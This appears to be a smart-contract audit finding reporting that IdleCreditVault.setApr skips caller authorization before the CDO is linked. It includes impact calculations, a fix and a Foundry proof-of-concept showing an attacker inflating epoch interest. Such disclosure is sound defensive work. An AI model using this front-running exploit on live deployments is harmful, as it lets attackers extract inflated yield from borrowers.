### Title

Unauthenticated APR overwrite before CDO wiring inflates lender claims - (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary

`IdleCreditVault.setApr` skips its caller authorization whenever `idleCDO == address(0)`. The setup exception is intended for deployment configuration, but it does not authenticate even the owner or manager. Any EOA can therefore front-run `setWhitelistedCDO` and overwrite both `lastApr` through `setApr`, or `unscaledApr` through `setAprs`/`setAprsWithBuffer`.

When the owner subsequently links the CDO and the manager starts an epoch, `IdleCDOEpochVariant.startEpoch` prices the epoch from the strategy APR and records the inflated borrower obligation in `expectedEpochInterest`. An attacker who is also a KYC-passing lender receives the inflated yield.

### Finding Description

The privileged operation analogous to the overwritten root-executed script is the strategy APR consumed by the epoch state machine.

`setApr` checks `msg.sender` only after `idleCDO` has been configured:

```solidity
if (_cdo != address(0)) {
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
}
lastApr = _apr;
``` [1](#0-0) 

`setAprs` and `setAprsWithBuffer` additionally let an unauthorized caller overwrite `unscaledApr` before calling `setApr`; if `idleCDO` is still zero, the nested authorization check is bypassed. [2](#0-1) 

The production factory normally configures APR and whitelists the CDO atomically: [3](#0-2) 

However, the contract itself does not enforce that setup ordering or caller. A manual deployment, migration, replacement strategy, proxy initialization, or any deployment path with separate `initialize`, APR setup, and `setWhitelistedCDO` transactions exposes a public overwrite window.

After linking, `startEpoch` computes expected borrower-paid interest using the strategy’s stored APR: [4](#0-3) 

`stopEpoch` is manager/owner gated, but the attacker does not need to call it. The honest manager’s call settles the inflated interest that was created by the attacker’s earlier write. [5](#0-4) 

The default cap limits the forged scaled APR to `DEFAULT_MAX_APR = 20e18` unless the owner later disables or raises the cap through `setMaxApr`. [6](#0-5) 

### Impact Explanation

An attacker can deposit into an otherwise honest vault after poisoning its APR and receive yield priced at up to 20% APR instead of the intended configured APR.

For an AA-only deployment with `P` underlying deposited, epoch duration `D`, and buffer `B`, the attacker can set:

```text
unscaledApr = 20e18
lastApr     = 20e18
```

or, where the manager expects a scaled value:

```text
lastApr = 20e18 * (D + B) / D
```

The excess borrower-funded interest is approximately:

```text
P * (forgedApr - intendedApr) * D / 365 days
```

For example, a sole lender depositing 1,000,000 USDC into a 30-day epoch intended to pay 5% APR but poisoned to 20% APR creates roughly 12,328 USDC of excess expected borrower interest before fees and rounding.

This breaks the fixed-APR yield invariant: the manager-approved APR, not a public caller’s setup-window write, should define the borrower obligation and lender receipt.

### Likelihood Explanation

The exploit requires a non-atomic configuration sequence. The provided `IdleCreditVaultFactory` closes the window when it is used because `_configureCreditVault` calls `setAprs` and `setWhitelistedCDO` in the same transaction. Manual deployment, migration, strategy replacement, or deployment by another factory can expose the window publicly.

No privileged role has to be malicious. The attacker only needs:

1. `idleCDO == address(0)` on `IdleCreditVault`.
2. One transaction before `setWhitelistedCDO`.
3. A deposit once the CDO is linked and wallet eligibility permits it.
4. Honest manager/borrower epoch execution.

The APR cap prevents unlimited manipulation in the default configuration, but still permits up to `20e18` APR.

### Recommendation

Do not bypass authorization based only on `idleCDO == address(0)`. Restrict the setup path to `owner()` or `manager` even before CDO wiring:

```solidity
function setApr(uint256 _apr) public {
  if (msg.sender != idleCDO && msg.sender != manager && msg.sender != owner()) {
    revert NotAllowed();
  }
  uint256 _maxApr = maxApr;
  if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
  lastApr = _apr;
}
```

Prefer a dedicated initialization/configuration function that atomically sets `idleCDO`, `lastApr`, and `unscaledApr`, and marks setup complete. The write should also emit an event and validate that the scaled/unscaled pair is internally consistent.

### Proof of Concept

```solidity
// test/foundry/AprSetupOverwrite.t.sol
function testAttackerOverwritesAprBeforeCdoLink() external {
  vm.createSelectFork("mainnet", FORK_BLOCK);

  address attacker = makeAddr("attacker");
  address owner = makeAddr("owner");
  address manager = makeAddr("manager");
  address borrower = makeAddr("borrower");

  IdleCreditVault strategy = new IdleCreditVault();
  stdstore
    .target(address(strategy))
    .sig(strategy.token.selector)
    .checked_write(address(0));

  // Intended APR is 5%, but the CDO is intentionally linked in a later tx.
  strategy.initialize(
    USDC,
    owner,
    manager,
    borrower,
    "borrower",
    5e18
  );

  // Public overwrite while idleCDO == address(0).
  vm.prank(attacker);
  strategy.setAprs(20e18, 20e18);

  assertEq(strategy.unscaledApr(), 20e18);
  assertEq(strategy.lastApr(), 20e18);

  IdleCDOEpochVariant cdo = new IdleCDOEpochVariant();
  stdstore
    .target(address(cdo))
    .sig(cdo.token.selector)
    .checked_write(address(0));

  cdo.initialize(
    0,
    USDC,
    owner,
    owner,
    makeAddr("rebalancer"),
    address(strategy),
    100000
  );

  vm.prank(owner);
  strategy.setWhitelistedCDO(address(cdo));

  vm.startPrank(owner);
  cdo.setEpochParams(30 days, 5 days);
  cdo.setKeyringParams(address(0), 0);
  cdo.setIsAYSActive(true);
  vm.stopPrank();

  uint256 depositAmount = 1_000_000e6;
  deal(USDC, attacker, depositAmount);

  vm.startPrank(attacker);
  IERC20Detailed(USDC).approve(address(cdo), depositAmount);
  cdo.depositAA(depositAmount);
  vm.stopPrank();

  uint256 expectedHonestInterest =
    depositAmount * 5e18 / 100 * 30 days / 365 days / 1e18;
  uint256 expectedForgedInterest =
    depositAmount * 20e18 / 100 * 30 days / 365 days / 1e18;

  // Honest borrower can fund the obligation.
  deal(USDC, borrower, expectedForgedInterest);
  vm.prank(borrower);
  IERC20Detailed(USDC).approve(address(cdo), type(uint256).max);

  vm.prank(manager);
  cdo.startEpoch();

  assertApproxEqAbs(
    cdo.expectedEpochInterest(),
    expectedForgedInterest,
    2,
    "epoch interest uses attacker-written APR"
  );
  assertGt(
    cdo.expectedEpochInterest(),
    expectedHonestInterest,
    "borrower obligation was inflated"
  );
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L88-91)
```text
  /// @notice default maximum allowed scaled apr
  uint256 public constant DEFAULT_MAX_APR = 20e18;
  /// @notice maximum allowed scaled apr, 0 disables the cap
  uint256 public maxApr;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L202-220)
```text
  /// @notice set both the scaled and unscaled apr
  /// @dev only cdo and manager can set the apr.
  /// @param _unscaledApr unscaled apr
  /// @param _apr scaled apr
  function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    unscaledApr = _unscaledApr;
    // here we also check that msg.sender is allowed
    setApr(_apr);
  }

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L225-235)
```text
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L288-307)
```text
  function _configureCreditVault(
    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    CreditVaultParams memory par,
    address keyringWhitelist,
    address manager
  ) internal {
    cv.setEpochParams(par.epochDuration, par.bufferPeriod);
    cv.setInstantWithdrawParams(par.instantWithdrawDelay, par.instantWithdrawAprDelta, par.disableInstantWithdraw);
    cv.setKeyringParams(keyringWhitelist, par.keyringPolicy);
    if (par.isInterestMinted) {
      cv.setIsInterestMinted(par.isInterestMinted);
    }
    cv.setIsDepositDuringEpochDisabled(par.isDepositDuringEpochDisabled);
    cv.setFeeParams(par.feeReceiver, par.fees, feeSplit, par.managementFee);
    cv.setGuardian(manager);
    // setAprs should be done before setWhitelistedCDO
    strategy.setAprs(par.apr, par.apr * (par.epochDuration + par.bufferPeriod) / par.epochDuration);
    strategy.setWhitelistedCDO(address(cv));
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L254-263)
```text
    // calculate expected interest 
    // NOTE: all withdrawal requests, burn tranche tokens and decrease getContractValue,
    // this can be done only prior to the start of the epoch so getContractValue() is the total amount net
    // of all withdrawal requests. We add the fee that we should get for normal pending withdraws
    // we also add/remove the over/under performance caused by withdraw requests.
    // Pending fees remain due even if fixed-APR requests exhaust active interest.
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
    interestForOverUnderPerformance = 0;
```

**File:** contracts/IdleCDOEpochVariant.sol (L321-335)
```text
  /// @dev Only owner or manager can call this function. Borrower MUST approve this contract
  function stopEpoch(uint256 _newApr, uint256 _interest) public {
    _stopEpoch(_newApr, _interest, 0);
  }

  /// @notice Internal stop-epoch implementation with optional proportional pending-receipt loss.
  /// @param _newApr New apr to set for the next epoch
  /// @param _interest Interest gained in the epoch
  /// @param _lossAmount Loss amount to split between active LPs and pending receipts
  function _stopEpoch(uint256 _newApr, uint256 _interest, uint256 _lossAmount) private {
    _checkOnlyOwnerOrManager();
    bool _isRequestingAllFunds = _interest == 1;
    _checkProgrammableBorrowerMode();

    IdleCreditVault _strategy = IdleCreditVault(strategy);
```
